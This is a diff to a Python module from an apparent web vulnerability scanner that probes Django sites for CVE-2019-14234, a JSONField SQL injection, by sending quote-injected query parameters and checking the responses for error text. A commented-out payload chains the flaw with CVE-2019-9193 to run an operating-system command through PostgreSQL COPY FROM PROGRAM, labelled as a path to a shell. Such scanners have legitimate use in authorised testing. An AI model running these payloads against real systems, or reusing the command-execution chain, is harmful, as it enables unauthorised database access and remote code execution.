@@ -1,64 +1,53 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
-from lib.tool import check
-from thirdparty import requests
+# from lib.tool import check
 
-def cve_2019_14234_scan(self, url):
+cve_2019_14234_payloads = [
+    {'path': '{URLCONF}/?detail__a\'b=123'},
+    # {'path': 'admin/vuln/collection/?detail__a\'b=123'},
+    # {'path': 'vuln/collection/?detail__a\'b=123'},
+    # {'path': 'collection/?detail__a\'b=123'},
+    # {'path': '?detail__a\'b=123'},
+    # {   # * 配合CVE-2019-9193完成Getshell
+    #     'path': "?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'touch /tmp/test.txt'--%20",
+    # }
+]
+
+def cve_2019_14234_scan(self, clients):
     ''' Django JSONfield sql注入漏洞
             需要登录, 并进入当前用户的目录下
     '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name
-    vul_info['vul_type'] = 'SQLinject'
-    vul_info['vul_id'] = 'CVE-2019-14234'
-    vul_info['vul_method'] = 'GET'
-    vul_info['headers'] = {}
+    client = clients.get('reqClient')
+    
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'SQLinject',
+        'vul_id': 'CVE-2019-14234',
+    }
+    
+    urlConfList = self.get_urlconf(client, vul_info)     # * 获取Django定义的URL路径
+    if not urlConfList:
+        return None
 
-    headers = self.headers
-    headers.update(vul_info['headers'])
+    for payload in cve_2019_14234_payloads:
+        for urlConf in urlConfList:
+            path = payload['path'].format(URLCONF=urlConf)
+            url = client.protocol_domain + '/'
 
-    for payload in self.cve_2019_14234_payloads:    # * Payload
-        path = payload['path']                      # * Path
-        data = payload['data']                      # * Data
-        target = url + path                         # * Target
-
-        vul_info['path'] = path
-        vul_info['data'] = data
-        vul_info['target'] = target
-
-        try:
-            res = requests.get(
-                target, 
-                timeout=self.timeout, 
-                headers=headers, 
-                data=data, 
-                proxies=self.proxies, 
-                verify=False
+            res = client.request(
+                'get',
+                url + path,
+                vul_info=vul_info
             )
-            logger.logging(vul_info, res.status_code, res)                        # * LOG
+            if res is None:
+                continue
 
-
-            # todo 判断
             if (('ProgrammingError' in res.text) or ('Request information' in res.text)):
                 results = {
-                    'Target': target,
+                    'Target': res.request.url,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Path': path
-                    }
+                    'Request': res
                 }
                 return results
-
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+    return None
